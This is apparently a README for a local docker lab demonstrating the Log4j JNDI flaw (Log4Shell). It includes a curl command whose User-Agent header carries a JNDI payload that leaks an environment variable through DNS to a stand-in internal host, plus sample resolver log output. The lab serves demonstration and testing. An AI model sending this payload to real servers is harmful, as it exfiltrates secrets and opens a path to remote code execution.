# Log4j RCE Vuln

## Requirements

* maven 3.2+
* java 11
* docker

## Running Locally

![demo](demo.gif)

In one terminal tab run:

```bash
mvn install && docker-compose up --build
```

In another terminal tab run:

```bash
curl -s "http://localhost:8080/" -H 'User-Agent: ${jndi:ldap://${env:SECRET_VAR}.log4j2.internal/a}'
```

And watch the output in the first tab.  You will see something like the following

```text
Dec 13 05:54:09 dnsmasq[17]: query[A] 12345.dw.internal from 172.16.238.11
Dec 13 05:54:09 dnsmasq[17]: forwarded 12345.log4j2.internal to 10.0.0.1
```